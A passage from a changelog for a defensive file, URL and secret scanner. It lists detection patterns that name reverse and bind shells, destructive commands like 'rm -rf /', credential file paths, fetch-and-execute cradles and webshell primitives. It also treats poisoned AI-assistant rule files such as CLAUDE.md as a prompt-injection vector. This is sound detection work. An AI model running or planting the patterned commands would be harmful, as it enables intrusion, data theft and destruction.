  `.ipynb` (Jupyter — code cells execute; output cells can carry
  executable HTML/JS rendered on open) and `.odc` (Office Data
  Connection — OLE DB string + command text hits attacker
  backends) →30. `.htaccess` confirmed already covered by the
  F52 server-config check (`AddType x-httpd-php` →55).
- **Legacy Office / template file extensions** (`hlse_file.c`):
  `.dotm`/`.xltm`/`.sldm` (macro-enabled templates), `.docb`
  (binary .docm), `.mdb`/`.accdb` (Access VBA + autoexec),
  `.vsdx`/`.vsdm` (Visio OLE embeds), `.pub` (Publisher),
  `.wpd` (WordPerfect) — all →30. `.rtf` deliberately stays on
  the safe-extension list: its exploits are caught by the
  content check (`rtf_embed_score`), not the name.
- **Typosquat registry coverage** (`hlse_supply.c`): PIP_TOP
  gains 20 documented attack targets (colorama, urllib3, six,
  certifi, python-dateutil, tqdm, pyjwt, botocore, opencv-python
  — colourama→colorama was PyPI 2017, python3-dateutil shipped
  malware Dec 2019); NPM_TOP gains 14 documented supply-chain
  victims (ua-parser-js Oct 2021, coa/rc, node-ipc, event-stream,
  colors/faker, bootstrap, jquery, core-js, tslib).
- **Windows handler file extensions** (`hlse_file.c`):
  `.library-ms`/`.search-ms`/`.settingcontent-ms` (Explorer
  hijack — WebDAV share / remote search / DeepLink command
  classes), `.scf` (IconFile NetNTLM harvest), `.gadget`/
  `.website` (remote package resolution), `.appref-ms`
  (ClickOnce bootstrap), `.deskthemepack` (ThemeBleed class)
  — all →30 like `.url`/`.theme`.
- **URI scheme coverage, cycle 80** (`hlse_core.c`): `vbscript:`
  now scores like `javascript:` (→90 ISOLATE, executable scheme);
  `res:`/`shell:`/`expect:`/`hcp:` join the URI-handler table
  (→35, remote indicator bumps to 60); `sftp:` joins the fetch
  scheme table so the non-web userinfo-credential check reaches
  it — `sftp://user:pass@host` now scores 70 like `ssh:`.
- **Scam-family vocabulary, cycle 79** (`hlse_text.c`):
  `EMERGENCY_SCAM_WORDS` gains third-person grandparent-scam
  framing ("grandchild is in jail", "needs bail money",
  "post bail for"); `FIN_ACTION_WORDS` gains invoice-lure and
  check-overpayment phrases ("unpaid invoice", "remit payment",
  "cash this check", "keep a portion", "send the difference",
  "overpayment"); `CALLBACK_PHISH_WORDS` gains the subscription-
  renewal callback family ("auto renew", "call to cancel",
  "renewal charge", "geek squad", "antivirus subscription",
  "charged $399"); `BAIT_WORDS` gains advance-fee loan /
  debt-relief / extended-warranty telemarketing phrases;
  `FAKE_ALERT_WORDS` gains domain-expiration and mailbox-quota
  fake notices plus scam-defining visa claims ("visa has been
  denied", "green card lottery") — generic "visa application"
  deliberately excluded (fires on legitimate correspondence).
- **Vendor credential prefixes** (`hlse_secrets.c`): `xkeysib-`
  (Brevo/Sendinblue, →80), `sl.` + 60-char tail (Dropbox long-form,
  →80), `AKCp` (JFrog Artifactory identity key, →80),
  `ATCTT`/`ATBB` (Bitbucket app password, →80), `dp.ct.` (Doppler
  config token, →85).
- **Romance-compensation / health-scam / pyramid vocabulary**
  (`hlse_text.c`): `GROOMING_WORDS` gains the sugar-daddy family
  ("sugar daddy", "weekly allowance", "text me on whatsapp",
  "dm me on telegram") plus miracle-cure clickbait ("miracle cure",
  "doctors hate", "big pharma", "fda banned", "one weird trick",
  "natural cure for"); `PRIZE_WORDS` gains the doubling/send-back
  family ("send 1 btc", "and get 2 back", "celebrity giveaway",
  bare "giveaway") and the gifting-circle pyramid family
  ("blessing loom", "susu", "savings circle", "abundance circle").
- **Daemon exec-hook carriers** (`hlse_file.c` F56): `snmpd.conf`
  `exec`/`extend`/`pass_persist`/`traphandle`/`monitor` → 50 (a
  command runs per SNMP query or trap); `rsyslog.conf` `omprog`/
  `ompipe`/`ommail` → 50 and `syslog-ng.conf` `program()` → 45
  (a process spawned per matching log line); `dhclient`/`*dhcp*`
  hook files with `exit-hooks`/`enter-hooks`/`script`/`|` → 45
  (script runs as root on every lease). `.maildroprc`/`mailfilter`
  with `|program` → 55 joins the delivery-pipe family.
- **`.ssh/rc` + `.ssh/environment` path carrier** (`hlse_file.c`):
  sshd sources `~/.ssh/rc` and `environment` on every login
  (PermitUserRC) but neither is rc-named — a path gate now enters
  them into rc-persist scoring; shell/exec content → 55, while a
  plain `FOO=bar` environment stays clean. The same gate also makes
  `BASH_ENV`/`PERL5OPT`/`PYTHONINSPECT` env-hook keys score 55 in
  any rc-file carrier.
- **Wi-Fi credential containers** (`hlse_file.c`): `wpa_supplicant.conf`
  and `hostapd.conf` with `psk=`/`wpa_passphrase`/`password=`/
  `key_mgmt` → 45 (cleartext wireless creds), bare file → 30.
- **Mail-delivery and MTA carriers** (`hlse_file.c` F56):
  `aliases`/`aliases.db`/`.aliases` with a `|program` entry → 50
  (runs a command on every inbound delivery at the MTA, root-context
  on most mailers), bare list → 30; `dovecot.conf` with `!include`
  or `mail_plugins`/`mail_plugin_dir` → 45, bare → 30 (the include
  pulls attacker config; plugin dirs load .so into the IMAP daemon).
- **`git mergetool`/`difftool` `cmd` key** (`hlse_file.c`): `cmd`
  joins the git exec-key table — `[mergetool "x"] cmd = <shell>`
  runs on every `git mergetool` invocation.
- **Build/init carrier residual gaps** (`hlse_file.c` F56):
  `rakefile`/`Rakefile.rb` joins the build-file carrier group —
  `system "…"`/`sh "…"` (paren-less Ruby idiom, previously missing
  next to `system(`) → 55. `sysctl.conf` hardening removal
  (`randomize_va_space`/`kptr_restrict`/`dmesg_restrict`/
  `ptrace_scope`/`perf_event_paranoid`/`unprivileged_bpf_disabled`
  =0/-1, or `unprivileged_userns_clone`=1) → 40 alongside
  `core_pattern=|`. `cron.allow`/`cron.deny`/`at.allow`/`at.deny`
  scheduling ACLs → 30. `setup.cfg` `[easy_install]` `index_url`/
  `dependency_links`/`find-links` resolver redirect → 45, and
  `pyproject.toml` `[tool.uv.sources]` git/path/index overrides → 45.
- **Encrypted private-key PEM markers** (`hlse_secrets.c`):
  `-----BEGIN ENCRYPTED PRIVATE KEY-----` and
  `-----BEGIN PKCS8 PRIVATE KEY-----` now flag like the other PEM
  headers — an encrypted key is still key material in exfiltration
  and a classic "open this attachment" lure payload.
- **Task-scam phrasing variants** (`hlse_text.c`): the existing
  task/job-scam word group gains the observed SAR strings that were
  slipping through — "complete tasks and earn", "earn commission",
  "task platform", "optimize your tasks", "unlock tasks",
  "deposit to unlock earnings", "like posts and earn",
  "boost sales"/"boost merchant", "merchant sales tasks",
  "improve their ranking". Solo hits still LOG-tier by design.
- **Credentials embedded in URL userinfo** (`hlse_core.c`): a `user:pass@`
  authority (non-numeric password field) adds +40 — on http/https it
  stacks with the existing @-trick score; on non-web schemes
  (`ftp://user:pass@host`) a parallel check fires in the scheme-table
  path, which previously never reached the @ logic. An all-digit tail
  (`host:443@`) is a port, not a password, and is skipped.
- **Sextortion completion + DMCA lure vocabulary** (`hlse_text.c`):
  `RANSOM_WORDS` gains device-control claims ("your computer has been
  hacked", "i have full access", "i control your device",
  "installed a trojan"), wallet destinations ("my bitcoin address",
  "send bitcoin to") and deadline phrasing ("pay within 72 hours",
  "you have 48 hours") — the 'hacked → pay BTC in Nh' chains that
  partial webcam lists missed. `FAKE_ALERT_WORDS` gains the fake
  copyright/DMCA notice family ("copyright infringement",
  "copyright strike", "takedown notice", "violates dmca") used by
  LonePixel/Rhadamanthys infostealer campaigns.
- **Slack session-theft token formats** (`hlse_secrets.c`): `xoxc-`
  (Slack client token) → 85 and `xoxd-` (Slack `d` session cookie)
  → 90 — the exfiltrated pair replays a full workspace session
  without the browser.
- **Credential-store / proxy carriers** (`hlse_file.c` F56):
  `git-credentials`/`.git-credentials` holding `://user:tok@host`
  lines → 55; `.htdigest`/`htdigest` → 40–45; `pg_service.conf`/
  `.pg_service` with `host`/`password` → 50; `squid.conf` with
  `http_access allow all`/`url_rewrite`/`ssl_bump` (open relay or
  interception hook) → 45.
- **JP utility/authority smishing + EN legal-threat vocabulary**
  (`hlse_text.c`): `CALLBACK_PHISH_WORDS` gains the JP utility
  non-payment and account-problem families — 水道料金/電気料金/
  ガス料金/公共料金/未納/未納料金/口座振替/ご請求, マイナンバー,
  お支払い方法に問題/支払い方法に問題, ご利用の確認/不正利用,
  重要なお知らせ/更新が必要/ポイントの有効期限/会員資格;
  `AUTHORITY_WORDS` gains the English legal-threat phrases used by
  IRS/CRA/debt impersonation — arrest warrant, warrant (has been)
  issued, legal action (will be taken), lawsuit has been filed /
  against you, court summons, you will be arrested, going to jail,
  wage garnishment, asset seizure, your assets will be.
- **Paste: listener / privilege-escalation one-liners** (`hlse_supply.c`,
  `hlse_supply.h`): new P13 signal (`PASTE_LISTENER_PRIV`) —
  bind-shell listeners (`nc -l`, `ncat -l`, `netcat -l`, ` -lv`,
  `nc -p`) → 45; SUID/setuid installs (`chmod +s`, `chmod u+s`,
  `chmod 4…`/`6…`, `u+s`, `setuid`) → 55; ad-hoc HTTP servers
  (`python -m http.server`, `php -S`, `SimpleHTTPServer`,
  `busybox httpd`, `ruby -ehttpd`) → 35 — staged payload hosting /
  loot-exfil listeners.
- **Paste: reverse-shell coverage widened** (`hlse_supply.c`): the
  socat detector now matches address keywords case-insensitively
  (`exec:`/`tcp:`/`tcp4:`/`tcp6:`/`tcp-l`), and `php -r`/`perl -e`
  one-liners carrying `fsockopen`/`socket_create`/`IO::Socket` join
  the reverse-shell class (60).
- **kubeconfig carrier** (`hlse_file.c`): basenames containing
  `kubeconfig` enter the rc-persist gate — `exec:` + `command:`
  (credential-plugin exec on every kubectl call) → 55, and
  `clusters:` + `users:` carrying `token`/`client-key`/`password`/
  `client-*-data` → 45 (a dropped kubeconfig hands over cluster
  access).
- **IPv4-mapped IPv6 SSRF evasion** (`hlse_core.c`): `[::ffff:a.b.c.d]`
  and `[::ffff:HHHH:HHHH]` literal hosts launder an internal v4 address
  past dotted-quad checks — the mapped tail is now evaluated as v4:
  loopback/RFC1918/link-local/CGNAT → 45, the IMDS endpoint
  (`169.254.169.254`) → 65, and any other mapped literal → 30 as a
  normalisation-evasion shape.
- **App/messenger/conference deep-link schemes** (`hlse_core.c`):
  `steam:`, `php:`/`phar:` (stream-wrapper LFI/deserialize primitives),
  `discord:`, `slack:`, `tg:`, `zoommtg:`/`zoomus:`, `msteams:`/`teams:`,
  `lync:`, `webex:`/`webexteams:`, `gotomeeting:`/`gotowebinar:`,
  `ringcentral:`, `bluejeans:`, `spark:`, `meet:`, `android-app:`,
  `spotify:`, `obsidian:`, `zotero:`, `notion:`, `figma:`, `linear:`,
  `raycast:`, `fb:`/`fb-messenger:`, `instagram:`, `twitter:`,
  `comgooglemaps:`, `geo:`/`maps:`, `rtsp:`/`rtmp:`/`mms:` join
  `URL_HANDLER_SCHEMES` — 35 base, 60 when a remote indicator
  (`http`, `\\`, `|u|`, `location=`) is embedded.
- **Notion/Meta/otpauth secret formats** (`hlse_secrets.c`):
  `ntn_` + ≥40 (Notion integration token) → 85; `EAA` + ≥28
  (Meta/Facebook long-lived access tokens: EAAB/EAAI/EAAA…) → 80;
  `otpauth://` URIs carrying `secret=` TOTP seeds → 85 via a new
  `is_uri_tail` predicate that accepts URI-tail characters.
- **Discord MFA + Twilio secret formats** (`hlse_secrets.c`): `mfa.`
  (Discord MFA token) → 85; `AC`/`SK` + 32 lowercase hex (Twilio
  Account SID / API Key) → 70 — new `is_hex_c` predicate keeps the
  2-char prefixes' false positives low.
- **Legacy/info URI schemes** (`hlse_core.c`): `feed:`, `webcal:`,
  `irc:`, `ircs:`, `ldaps:`, `finger:`, `whois:`, `dayz:` join the
  legacy-scheme family at 30 — non-web fetch/handler schemes that
  bypass URL filters (IRC/directory/calendar-protocol lures,
  information-disclosure handlers).
- **Paste: destructive/credential/persistence/eval-fetch patterns**
  (`hlse_supply.c`, `hlse_supply.h`): P9 → 60 for destructive payloads
  (`rm -rf /`/`rm -rf ~`/`rm -rf $HOME`, fork bomb, `mkfs.`,
  `dd if=`, `shred`, `> /dev/sd`, `chmod -R 777`); P10 → 40 for
  credential/key file access (`.ssh/id_*`, `.aws/credentials`,
  `.gnupg/`, `.kube/config`, `.docker/config.json`, `.netrc`,
  `.git-credentials`, `shadow`, `/etc/passwd`); P11 → 45 for
  persistence writes (appending to `.bashrc`/`.zshrc`/`.profile`/
  `authorized_keys`/`rc.local`/`.xinitrc`/`.zshenv`, `crontab`,
  `systemctl enable`, `launchctl load`); P12 → 45 for eval/source of
  fetched content (`eval $(curl …)`, `source /tmp/x`, backtick
  command-substitution fetch) — the non-pipe form of the download
  cradle P2 catches.
- **Vishing/IM deep-link schemes** (`hlse_core.c`): `callto:`,
  `facetime-audio:`, `wtai:`, `sip:`, `im:`, `xmpp:` join the mobile
  deep-link family at 35 — the same click-to-call/message handler
  vector as `tel:`/`sms:`/`skype:` (premium-rate vishing, attacker
  contact pivoting).
- **Nostr secret key format** (`hlse_secrets.c`): `nsec1` + ≥40 bech32
  payload chars → 80 (a nsec is the account itself — posting, DMs and
  the zap wallet); new `is_bech32` predicate restricts the suffix to
  the bech32 charset (lowercase alnum minus b/i/o) so ordinary text
  containing "nsec" stays clean.
- **F56 system-config carriers** (`hlse_file.c`): files whose *name*
  makes them act when dropped in place — `sudoers`/`sudoers.*`/`doas.conf`
  with `NOPASSWD`/`permit nopass` → 60 (`ALL=(ALL)` grant alone → 40);
  `ld.so.preload`/`ld.so.conf*` → 55 (loader injects the listed .so into
  every process — rootkit persistence); `.conf`/`.service` carrying
  `ld_preload`/`ld_library_path`/`dyld_insert_libraries` → 55;
  `resolv.conf` with a `nameserver` line → 45 and `hosts`/`nsswitch.conf`
  → 30, raised to 45 when a `hosts` line maps a hostname to a *public*
  IPv4 (domain hijack — loopback/RFC1918/ad-block entries stay clean);
  `crontab`/`*.cron*` files containing a schedule → 40.
  Extended: bare `authorized_keys`/`authorized_keys2` → 50 (a dropped
  file grants its key SSH access — option keys stay with F18);
  `.forward` → 45 and `.procmailrc`/`.mailfilter` → 40, raised to 55
  when a recipe pipes mail through a program; X login scripts
  `.xinitrc`/`.xsession`/`.xprofile` → 45.  Extended further: launchd
  `.plist` with RunAtLoad/KeepAlive/WatchPaths/StartInterval/
  ProgramArguments → 55 (macOS persistence carrier); zsh startup files
  `.zshenv`/`.zprofile`/`.zlogin` → 50 (.zshenv runs on every zsh,
  incl. non-interactive) and `.bash_profile`/`.bash_login`/
  `.bash_logout` → 40; package-manager configs `pip.conf`/`pip.ini`/
  `condarc`/`.condarc` with index-url/extra-index/channels/trusted-host
  → 50, bare → 35 (dependency-confusion at install).  The ubiquitous
  `.bashrc`/`.zshrc`/`.profile` stay name-clean — F18's content gate
  already covers them.  Extended further: `sshd_config` → 60
  (PermitRootLogin/PermitEmptyPasswords/AuthorizedKeysFile/ForceCommand
  /PermitUserEnvironment; bare → 30); web/proxy daemon configs
  (`nginx.conf`/`httpd.conf`/`apache2.conf`/`haproxy.cfg`/`caddyfile`/
  `traefik.*`) with proxy_pass/redirect/server/backend → 45 (bare 30);
  auth DBs `shadow`/`passwd`/`group`/`gshadow`/`master.passwd` with
  `root`/`$hash`/`:x:` entries → 55 (bare 30); DB configs
  (`redis.conf`/`mongod.conf`/`postgresql.conf`/`my.*`/
  `elasticsearch.yml`) bind-0.0.0.0 + no-auth → 55 (bind-all alone 40);
  WireGuard `[Peer] AllowedIPs 0.0.0.0/0` or `::/0` → 55; `php.ini`
  auto_prepend/auto_append/allow_url_include → 55 (disable_functions /
  open_basedir 40).  Extended further: tool launch configs —
  `config.fish`/`.tmux.conf`/`tmux.conf`/`.muttrc`/`muttrc`/
  `.screenrc`/`config.exs` → 45 (each evals or executes content when
  the tool starts — same persistence class as shell rc). Further:
  device/auth/boot execution carriers — udev `.rules` with
  `RUN+=`/`PROGRAM=`/`IMPORT{` fire when a device is plugged → 55;
  polkit `.rules` are JS evaluated at every authorization —
  `polkit.spawn`/`UnixProcess`/`system(` → 50; modprobe `install
  <mod> <cmd>`/`post-install`/`pre-remove` hooks → 55; systemd-tmpfiles
  `f+`/`w`/`d`/`l` directives plant files at boot → 40; an `Info.plist`
  declaring `CFBundleExecutable` plus `LSUIElement`/`LSBackgroundOnly`
  is a stealth background app → 50.
- **`pkbb` distro package-build ecosystem** (`hlse_manifest.c`,
  `hlse_cli.c`): `PKGBUILD`/`APKBUILD`/`pkgname.install`/`*.ebuild`/
  `*.spec` route to a new checker — their function bodies and
  scriptlets execute verbatim on makepkg/abuild/emerge/rpmbuild and on
  every package install (the AUR malicious-PKGBUILD class). Fetch-exec
  lines (`curl`/`wget`/pipe-to-shell/`eval`/`base64 -d`/`chmod +x`)
  → 55; install/upgrade/removal hook scriptlets (`post_install`,
  `pkg_postinst`, `%post`, `%trigger`, …) → 45. `source=("http…")` and
  `url=` are the declared-fetch idiom, so they do NOT flag — only
  lines that fetch-and-execute, decode, or name a hook do.
- **`.dist` productbuild installer definitions** (`hlse_file.c`,
  F56): a `.dist` targeting `LaunchDaemons`/`LaunchAgents`/`/Library/`
  plants a daemon on package install → 50.
- **Tool default-option + editor/boot init carriers** (`hlse_file.c`,
  F56): `.curlrc`/`_curlrc`/`.wgetrc` whose `output*`/`directory_prefix`
  pairs with `url`/`input`/`http` → 50 (every curl/wget run applies the
  redirect — an invisible download-destination hijack); `.vimrc`/
  `_vimrc`/`init.vim`/`init.lua`/`.exrc`/`_exrc` with
  `autocmd`/`system(`/`os.execute`/`io.popen`/`:!`/`vim.fn` → 50
  (editor-startup code exec); `win.ini`/`system.ini` with `run=`/`load=`
  or a non-default `shell=` → 50 (classic boot persistence; the stock
  `shell=explorer.exe` does not fire); `CMakeLists.txt` whose
  `execute_process`/`ExternalProject`/`add_custom_command`/
  `add_custom_target` reaches `curl`/`wget`/`Invoke-WebRequest`/
  `bitsadmin`/`|sh`/`base64` → 55 (configure/build-time payload — the
  CMake form of the Makefile `$(shell)` check).
- **Tool-config-as-code + Java container + deploy descriptors**
  (`hlse_file.c`, F56): `*.config.{js,ts,mjs,cjs,mts}`/`*.conf.{js,ts}`/
  `gulpfile.*`/`gruntfile.*`/`conftest.py`/`noxfile.py`/`setup.py`/
  `config.ru`/`tsconfig.json`/`jsconfig.json`/`jsr.json`/`deno.json(c)`/
  `bunfig.toml` with require/import/plugins/exec/spawn/cmdclass/
  pytest hooks/tasks/paths/registry → 40 (these files evaluate code at
  tool startup); `wercker.yml`/`bitrise.yml`/`pipeline.y*ml`/
  `concourse.yml` runnable step keys → 45; `*.nomad`/`*.hcl` nomad/
  consul/packer/vault/waypoint task/driver/provisioner/script → 45;
  `serverless.y*ml`/`sst.config.*` plugins/functions → 40;
  `netlify.toml` command/plugins/redirects → 45; `vercel.json`/
  `now.json` functions/rewrites/crons → 45; `fly.toml` release_command/
  entrypoint → 45; `app.yaml`/`appengine-web.xml`/`render.yaml`/
  `heroku.yml`/`app.json`/`dokku.json`/`railway.*` entrypoint/
  buildCommand/startCommand/preDeployCommand/buildpacks → 45;
  `server.xml`/`context.xml`/`web.xml`/`applicationContext.xml`/
  `beans.xml`/`struts.xml`/`faces-config.xml`/`ejb-jar.xml`/
  `persistence.xml`/`hibernate.cfg.xml`/`weblogic.xml`/`spring*.xml`/
  `jboss*.xml` class/listener/resource/jndi/datasource → 50;
  `log4j*`/`logback*`/`logging.properties` `${jndi:`/socketAppender/
  smtpAppender/JMSAppender → 55 (Log4Shell lookup surface);
  `MANIFEST.MF` `Premain-Class`/`Agent-Class`/`Launcher-Agent-Class`/
  `Class-Path`/`Can-Redefine` → 50 (java-agent exec);
  `*.slk` `Cmd=`/`EXEC`/`shell`/`dde`/`macro` → 55 (SYLK DDE);
  `makefile`/`gnumakefile`/`bsdmakefile` `$(shell`/`-include`/`curl`/
  `wget`/`eval`/`bash`/`powershell` → 45.
- **Ecosystem descriptor redirects** (`hlse_file.c`, F56):
  `pubspec.yaml`/`.lock`/`_overrides` git:/hosted:/path:/deps → 45;
  `deps.edn`/`bb.edn`/`build.edn` `:git/url`/`tasks`/`deps` → 45;
  `mix.exs` git:/github:/path: deps → 45; `project.clj`/`build.boot`
  repositories/eval-in-leiningen/deftask → 45; `shard.yml`/
  `shard.lock` github:/gitlab:/git: deps/postinstall → 45;
  `composer.json`/`composer.lock` scripts/repositories/
  minimum-stability/allow-plugins → 45; `cabal.project`/`stack.y*ml`
  source-repository/location/extra-deps → 45; `rebar.config`/
  `rebar3.config` deps/hooks/escript → 45; `dune`/`dune-project`/
  `*.opam` `(rule`/`(action`/`(run`/`(system`/`depexts`/`pin-depends`
  → 45; `*.nix`/`guix.scm`/`manifest.scm`/`channels.scm` fetchurl/
  fetchgit/fetchtarball/inputs/shellHook/installPhase/mkDerivation/
  origin/channels → 45; `nim.cfg`/`*.nimble`/`*.nims` task/requires/
  switch/installDirs → 45; `.code-workspace` tasks/launch/
  executablePath/server.path/defaultInterpreterPath/alternateTools →
  45 (vscode settings can point language-server/interpreter binaries
  at attacker paths).
- **IaC + remote-tool credential + mail/location carriers**
  (`hlse_file.c`, F56): `kustomization.yaml` resources/bases/
  helmCharts/generators/patches reaching `http`/`git@`/`.git` → 45;
  `Chart.yaml` dependencies/repository → 40; `*.tfvars`/`*.tfstate`
  password/secret/private_key/access_key/token/resources/backend → 50
  (plaintext infra secrets); `credentials.json`/`service-account*`/
  `client_secret*`/`*-key.json` service_account/private_key/
  client_secret/refresh_token/token_uri → 65 (cloud key material);
  `.env`/`*.env`/`.env.*`/`env.list`/`envfile` password/secret/token/
  key/api → 45 (`.env.example`/`.env.sample`/`.env.template`/`.env.dist`
  excluded); FileZilla `sitemanager.xml`/`filezilla.xml`/
  `recentservers.xml` Pass/User/Host → 55; `winscp.ini` password/
  hostname/hostkey → 55; `.pcf` `enc_GroupPwd`/host/groupname → 50
  (cisco VPN creds); `.remmina` server/password → 45; `.vnc` host/
  password → 45; `confCons.xml`/mRemoteNG/`connections.xml`/`.rdg`
  password/hostname/protocol → 55 — the harvested-file list every
  infostealer targets.
- **Mail-delivery, notification + location carriers** (`hlse_file.c`,
  F56): `.sieve` `pipe`/`execute`/`vnd.dovecot.*`/`filter`/`include`+http
  → 55 (program per delivered message); `getmailrc`/`fdm.conf`/
  `.esmtprc` `mda`/`pipe`/`filter`/`external`/`preconnect`/
  `postconnect`/`path=` → 50; `dunstrc` `script=`/`always_run_script`/
  `on_*` → 45 (runs on every notification); `.xscreensaver`
  `programs:` → 40; `gtkrc`/`*.gtkrc` `engine`/`module_path`/
  `pixmap_path`/`include` → 45 (loads .so theme modules); macOS
  `.terminal` `CommandString`/`RunCommandAsShell` → 60 (double-click
  runs a shell line); `.ftploc`/`.afploc`/`.vloc`/`.mailloc`/
  `.newsloc`/`.fileloc` → 45 (open mounts a remote share/VNC client);
  `.eml`/`.msg`/`.mbox` From/Subject + http/attachment → 35 (phish
  carrier); `.vcf`/`.vcard` PHOTO/URL/SOUND URI → 35 (fetch-on-import).
- **Desktop/build/IDE + AI-instruction carriers** (`hlse_file.c`,
  F56): `.desktop`/`directory` `Exec=`/`TryExec`/`X-KDE-*` → 50;
  `.theme`/`.themepack` `SCRNSAVE.EXE`/`.scr`/`VisualStyles` → 50
  (screensaver binary swap); `.settingcontent-ms` `DeepLink`/`Cpl`/
  `HostPage` → 60 (CVE-2018-8414 auto-launch); `.application`/
  `.appref-ms` `codebase`/`deploymentProvider` → 50 (ClickOnce feed);
  `.csproj`/`.fsproj`/`.vcxproj`/`.vbproj`/`.targets`/`.props`/
  `.proj` `Exec`/`PreBuildEvent`/`PostBuildEvent`/`UsingTask`/
  `CodeTask`/`BeforeTargets`/`AfterTargets`/`DownloadFile` → 55
  (MSBuild-time exec; `Directory.Build.props` already covered);
  `*.cmake` `execute_process`/`file(DOWNLOAD)`/`ExternalProject` → 55;
  `*.ninja` `command =` → 50; `go.mod`/`go.work` `replace`/`retract`
  → 40; `Gemfile`/`gems.rb` `:git`/`git:`/`path:`/`eval_gemfile`/
  `instance_eval` → 45; `nuget.config` `packageSources`/`add key`/
  `value=`+`http` → 45; `cloudbuild.yaml` `steps`/`args`/`entrypoint`
  → 50; `.woodpecker.yml`/`woodpecker.yml` `commands`/`script`/
  `steps` + fetch/shell primitive → 45; vscode `tasks.json`
  `command`/`shell`/`script` + fetch/shell primitive → 50;
  `launch.json` `program`/`runtimeExecutable`/`preLaunchTask` → 45;
  `.cursorrules`/`.windsurfrules`/`copilot-instructions.md`/
  `CLAUDE.md`/`AGENTS.md` with a fetch/exec payload line (`curl`/
  `wget`+`http`, `| sh`, `base64 -d`, `nc -e`, `eval $(`, `bash -c`,
  `iex(`) → 50 — AI-assistant rule files are read into the model
  context, so a poisoned line is a prompt-injection supply-chain
  vector; plain documentation stays clean.
- **Ruby toolfiles** (`hlse_file.c`, F56): the Dangerfile/Guardfile/
  Capfile group extended to `Snapfile`/`Gymfile`/`Matchfile`/
  `Deliverfile`/`Scanfile`/`Screengrabfile`/`Pilotfile`/`Pluginfile`/
  `Appfile`/`Berksfile`/`Cheffile`/`Thorfile`/`Fastfile`/
  `Policyfile.rb` — `sh`/`system`/backtick/`eval`/`exec`/`curl`/
  `wget`/`git:`/`:git`/`cookbook`/`source` → 45.
- **Webshell bodies + credential containers** (`hlse_file.c`, F56):
  `.php`/`.phtml`/`.php5`/`.pht`/`.phar`/`.inc` with eval/assert/
  system/passthru/exec/popen/proc_open/shell_exec/backtick/
  preg_replace fed from `$_*`/`request` → 75, decode cradle
  (base64_decode/gzinflate/str_rot13/strrev + eval/`$_`) → 60,
  `move_uploaded_file`+`$_FILES` → 50; `.jsp*` `exec`/`ProcessBuilder`/
  `getRuntime` fed from `request`/`getParameter` → 75; `.asp`/`.aspx`/
  `.ashx`/`.asmx`/`.cer` WScript.Shell/CreateObject/Process.Start/
  cmd.exe/powershell/shell.application/Request → 75; `.cfm`/`.cfc`
  cfexecute/cfhttp/CreateObject/evaluate → 60; `.pl`/`.cgi`
  system/exec/open2/open3/backtick/qx fed from param/env/stdin → 55;
  `.lua` os.execute/io.popen/loadstring/dofile+http → 55; `.sql`
  xp_cmdshell/INTO OUTFILE/INTO DUMPFILE/load_file/sp_oa*/COPY
  PROGRAM/lo_import/pg_read_file/sys_eval/utl_file/sqlmap → 60;
  `.hta` ActiveXObject/WScript.Shell/Run/Exec/powershell/mshta/
  vbscript/javascript:/CreateObject → 55; `.wsf`/`.wsh` script/run/
  exec/cscript/wscript → 50; `.css`/`.htc` expression(/behavior/
  -moz-binding/javascript:/vbscript:/binding: → 45; `.ics`/.ical/
  `.ifb` ATTACH/URL+http → 35; `.lsp`/`.mnl`/`acad.lsp`/
  `acaddoc.lsp` (command/startapp/vl-cmdf/arxload/(load+http/shell
  → 45 (AutoCAD lisp runs on project open); `startup.m`/`finish.m`/
  `init.m` system/eval/unix/dos/urlread/websave/Run/Import/
  PacletInstall → 45.
- **Credential/key material as files** (`hlse_file.c`, F56):
  `BEGIN * PRIVATE KEY`/`openssh-key-v1`/`PuTTY-User-Key-File` → 80
  (public CERTIFICATE stays LOG 30); `id_rsa`/`id_dsa`/`id_ecdsa`/
  `id_ed25519`/`identity` with key markers → 80; `wallet.dat`/
  `electrum.dat`/`*.wallet`/`*.keys` → 45; `.kirbi`/`.ccache`/
  `.ktb`/`krbtgt` → 55; `*.dmp`/`*.mdmp`/`*.dump`/`core`/
  `lsass.dmp`/`memory.dmp`/`hiberfil.sys`/`pagefile.sys` → 45;
  Firefox/Chrome stores (`logins.json`, `key3.db`/`key4.db`,
  `cert8.db`/`cert9.db`, `cookies.sqlite`, `signons.sqlite`,
  `formhistory.sqlite`, `Login Data`, `Web Data`) → 45;
  `secring.*`, `.kdb`/`.kdbx`/`.keychain`/`.agilekeychain`/
  `.opvault`/`.keystore`/`.jks`/`.ppk` → 45; `.pem`/`.key`/`.p8`
  → 30; `cookies.txt` Netscape-format → 45.
- **Daemon/client hook carriers** (`hlse_file.c`, F56): `rsyncd.conf`/
  `rsyncd.secrets` `xfer exec`/`early exec`/`secrets file` → 50;
  `crypttab` `keyscript`/`precheck`/`postcheck` → 55 (root exec in the
  initramfs on every boot); `ansible.cfg` `*_plugins`/`*_paths`/
  `library`/`module_utils`/`stdout_callback`/`connection` → 45 (loads
  Python as code on every run); `.hgrc`/`hgrc`/`mercurial.ini`
  `[hooks]`/`[extensions]` with `=` → 50; `lynx.cfg`/`lynxrc`/
  `.lynxrc` `EXTERNAL`/`DOWNLOADER`/`PRINTER`/`SYSTEM_EDITOR` → 45;
  `.offlineimaprc`/`offlineimaprc`/`offlineimap.conf` `*tunnel`/
  `*eval`/`hook` → 50; `.authinfo`/`authinfo`/`*.authinfo.gpg`
  `machine`+`password`/`login` → 40.
- **Repo-fetch + hook-pipeline carriers** (`hlse_file.c`, F56):
  `.gitmodules` `url` → 45 (next `git submodule update` fetches the
  attacker repo); `.pre-commit-config.yaml` `repo:`+`http` → 45
  (clones+runs hook code on every commit); `terragrunt.hcl`/
  `.terraformrc`/`terraform.rc` `before_`/`after_`/`error_hook`/
  `run_cmd`/`dev_overrides`/`plugin_cache`/`provider_installation`
  → 50; `plugins.sbt`/`build.sbt` `addSbtPlugin`/`resolver`/`http`
  → 45; `uv.toml` `index-url`/`extra-index-url`/`find-links` → 45;
  `pyproject.toml` `tool.poetry.source`/`tool.uv`/`index-url` → 45;
  `settings.json` `executablePath`/`interpreterPath`/
  `script-torrent-done`/`git.path` → 50 (the basename is generic so
  only keys that name a program another tool will run fire).
- **GitLab secondary token families** (`hlse_secrets.c`): `glcbt-`
  CI build token → 80, `glptt-` pipeline trigger token → 80,
  `glagent-` cluster agent token → 80, `glft-` feed token → 75,
  `glimt-` incoming mail token → 75, `gloas-` OAuth app secret → 85
  — the `glpat-`/`glrt-`/`gldt-`/`glsoat-` rows already covered the
  primary families; these close the `gl*` prefix matrix.
- **Package-descriptor + boot/kernel carriers** (`hlse_file.c`, F56):
